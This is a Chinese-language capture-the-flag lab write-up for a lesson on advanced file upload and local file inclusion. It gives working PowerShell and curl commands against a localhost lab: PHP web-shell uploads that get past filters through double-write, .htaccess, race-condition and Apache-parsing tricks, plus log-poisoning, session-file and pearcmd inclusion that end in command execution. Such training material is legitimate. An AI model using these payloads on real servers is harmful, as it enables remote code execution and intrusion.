# 题解：upload-lfi-adv（第 5b 课 · 上传/包含进阶）

> 做完再看。模块端口 8086，allow_url_include 已关闭。

---

## up6 双写绕过

**漏洞**：`str_replace('php', '', $name)` 只扫一遍，删除而非拒绝。

```powershell
Set-Content -Path D:\deepseek\ctf-lab\d.pphphp -Value '<?php system($_GET[1]); ?>'
curl.exe -F "f=@D:\deepseek\ctf-lab\d.pphphp" http://localhost:8086/up6/
# 响应:上传成功:/up6/uploads/d.php   ← pphphp 删掉中间 php 后拼回 php
curl.exe "http://localhost:8086/up6/uploads/d.php?1=cat%20/flag_up6.txt"
```

**考点本质**：单次替换的软肋——删掉一个 `php` 后，左右残留字符重新拼出 `php`。"删一个，嵌两个"。

---

## fi5 日志包含

**漏洞**：裸 include + 服务器把每次访问（含 User-Agent）写进 /var/log/visit.log。

```powershell
# ① 投毒:UA 是谁发的?你。日志记什么?你的 UA
curl.exe -A '<?php system($_GET[1]); ?>' "http://localhost:8086/fi5/?page=inc/home.php"
# ② 包含日志 → 日志里的代码行被执行
curl.exe "http://localhost:8086/fi5/?page=/var/log/visit.log&1=cat%20/flag_fi5.txt"
```

**考点本质**：伪协议被关后，问自己"哪份服务器上的文件，内容是我可控的？"——日志、session、临时文件是三大答案。日志包含 = 把日志文件变成 webshell。
**坑**：payload 里 $_ 必须用 PS 单引号包，双引号会插值吞掉。

---

## up5 .htaccess 接管

**漏洞**：黑名单只拦文件，不拦配置文件；AllowOverride All 让 .htaccess 生效。

```powershell
# ① 写 .htaccess（LF 换行 + 无 BOM，两个坑都在这）
[IO.File]::WriteAllText("D:\deepseek\ctf-lab\.htaccess", "<FilesMatch `"\.gif$`">`nSetHandler application/x-httpd-php`n</FilesMatch>`n", (New-Object System.Text.UTF8Encoding($false)))
# ② 传配置
curl.exe -F "f=@D:\deepseek\ctf-lab\.htaccess" http://localhost:8086/up5/
# ③ 传马（纯 PHP 即可，没有内容检查）
Set-Content -Path D:\deepseek\ctf-lab\m.gif -Value '<?php system($_GET[1]); ?>'
curl.exe -F "f=@D:\deepseek\ctf-lab\m.gif" http://localhost:8086/up5/
# ④ 触发：.gif 被 .htaccess 规定成 PHP
curl.exe "http://localhost:8086/up5/uploads/m.gif?1=cat%20/flag_up5.txt"
```

**考点本质**：抢到的不是"传马权限"而是"解析规则制定权"——整个目录怎么解析由你写。黑名单思维连"配置也是文件"都想不全。
**坑**：CRLF → Apache 500；BOM → 无此问题但顺手一起防。

---

## up7 竞争条件

**漏洞**：move_uploaded_file 在检查之前执行；检查（sleep 1 秒模拟扫描）不过才 unlink。

```powershell
# 窗口 A：后台狂传
$job = Start-Job { 1..40 | % { curl.exe -s -F "f=@D:\deepseek\ctf-lab\shell.php" http://localhost:8086/up7/ | Out-Null } }
# 窗口 B：前台狂访问，抢文件存在的 1 秒
1..120 | % { curl.exe -s "http://localhost:8086/up7/uploads/shell.php?1=cat%20/flag_up7.txt" }
$job | Wait-Job | Out-Null; Remove-Job $job
```

**考点本质**："拒绝上传"≠"文件从未存在"。保存与检查之间的时间差就是攻击窗口。真实场景：先落盘再扫描/再重命名的代码都可能有这个洞。验证时抢中率 112/120。

---

## fi6 Session 包含

**漏洞**：$_SESSION['u'] 由用户输入写入，session 文件落在 /tmp/sess_<ID>。

```powershell
# ① 写入：-c 存 cookie 到 jar
curl.exe -s -c D:\deepseek\ctf-lab\jar.txt -G --data-urlencode 'u=<?php system($_GET[1]); ?>' http://localhost:8086/fi6/ | Out-Null
# ② 找会话 ID（jar.txt 里 PHPSESSID 那行的最后一列）
Select-String PHPSESSID D:\deepseek\ctf-lab\jar.txt
# ③ 带着同一 cookie 包含 session 文件（内容:u|s:26:"<?php system($_GET[1]); ?>"）
curl.exe -s -b D:\deepseek\ctf-lab\jar.txt "http://localhost:8086/fi6/?page=/tmp/sess_<ID>&1=cat%20/flag_fi6.txt"
```

**考点本质**：session 文件是"内容可控的服务器文件"第二名。两次访问必须带同一 Cookie（-c 存 / -b 带），否则写入和包含的不是同一个 sess 文件。

---

## fi7 pearcmd 写文件

**漏洞**：服务器自带 PEAR（/usr/local/lib/php/pearcmd.php）+ register_argc_argv=On → URL 查询串成为 pearcmd 的命令行参数；config-create 把 from 参数原样嵌入输出文件。

```powershell
# ① 把 PHP 代码当 from 传，生成嵌着代码的配置文件（-g 必须：URL 里的 [] 会被 curl 当通配）
curl.exe -sg 'http://localhost:8086/fi7/?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1])?>+/tmp/x.php'
# ② 包含它
curl.exe "http://localhost:8086/fi7/?page=/tmp/x.php&1=cat%20/flag_fi7.txt"
```

**考点本质**：LFI 的终极思路不是"找到可执行文件"而是"想办法让服务器自己写一个出来"。pearcmd 是 2021 年后 CTF 高频，因为它不依赖 allow_url_include。
**三坑合一**：argv 不做 URL 解码（payload 必须裸传，不能 %3C）、curl 要 -g、PS 要单引号。

---

## up8 Apache 解析漏洞

**漏洞**：白名单 + getimagesize 全过，但服务器 Apache 配置用了老式 AddHandler——扩展名从右往左找处理器。

```powershell
# ① 做"照片"：GIF89a 开头过内容检查，文件名 .jpg 结尾过白名单
[IO.File]::WriteAllText("D:\deepseek\ctf-lab\h.php.jpg", "GIF89a<?php system(`$_GET[1]); ?>", (New-Object System.Text.UTF8Encoding($false)))
curl.exe -F "f=@D:\deepseek\ctf-lab\h.php.jpg" http://localhost:8086/up8/
# ② 触发：Apache 扫 .jpg（没注册）→ 再扫 .php（AddHandler 注册了）→ 当 PHP 跑
curl.exe "http://localhost:8086/up8/uploads/h.php.jpg?1=cat%20/flag_up8.txt"
```

**考点本质**：白名单守的是"上传什么"，AddHandler 决定"怎么执行"——两套系统各管各的，缝隙就在中间。三大解析漏洞家族：Apache 多扩展名 / IIS 6.0 分号 / Nginx 路径修复。
**坑**：Set-Content 可能写 BOM → GIF89a 前面多了三个字节 → getimagesize 判非图片。用 WriteAllText 无 BOM。

---

## fi8 毕业考：拼接 + 日志 + 吸收 三合一

**处境**：include('pages/'.$p.'.php') 前后焊死、伪协议全关、无上传点。乍看无解。

**合成**（三招全是学过的）：
```
fi5 的投毒:  UA 写入日志
题目设定:    日志文件叫 /var/log/fi8log.php（.php 结尾）
fi2 的吸收:  ?page=../../../../../var/log/fi8log
             → include('pages/../../../../../var/log/fi8log.php')
             → 后缀 .php 被文件名吸收 → 日志被当代码执行
```

```powershell
# ① 投毒（投一次，两个日志都进）
curl.exe -A '<?php system($_GET[1]); ?>' "http://localhost:8086/fi8/?page=home"
# ② 吸收式包含
curl.exe "http://localhost:8086/fi8/?page=../../../../../var/log/fi8log&1=cat%20/flag_fi8.txt"
```

**考点本质**：LFI 高阶题 = 旧招的新组合。单看每个防御都成立，组合起来出现缝隙——这就是真实漏洞挖掘的思维模型。

---

## 结语：第 5 课 + 5b 课全景

```
上传:无检查 → 黑名单 → MIME → 白名单+内容 → [双写/.htaccess/竞争/解析漏洞]
包含:穿越 → 拼接 → filter → 伪协议RCE → [日志/session/pearcmd/三合一]
```

到这,LFI 三问彻底齐了:读到哪(任意文件)、怎么读源码(filter)、伪协议关了怎么 RCE(找可控内容的服务器文件)。
